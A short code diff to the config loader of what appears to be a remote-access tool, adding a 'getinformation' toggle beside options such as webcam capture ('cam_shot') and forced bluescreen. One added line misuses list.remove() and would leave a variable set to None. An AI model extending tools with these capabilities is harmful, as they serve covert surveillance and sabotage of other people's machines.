@@ -25,6 +25,9 @@ def config_load():
         # if not os.path.exists('./config'):
         #     os.mkdir('./config')
         main.print_normal("settings>[*]Initializing......")
+        init_dict = {}
+        mods = os.listdir('./PINGPONG_script').remove('__pycache__')
+
         init = {
             "handler" : {
                 'listen_Default_ip' : "127.0.0.1",
@@ -39,7 +42,8 @@ def config_load():
                 'upload' : True,
                 'cam_shot' : False,
                 'priv_vbp_listen' : True,
-                'bluescreen' : True
+                'bluescreen' : True,
+                'getinformation' : True
                 }
             }
         }
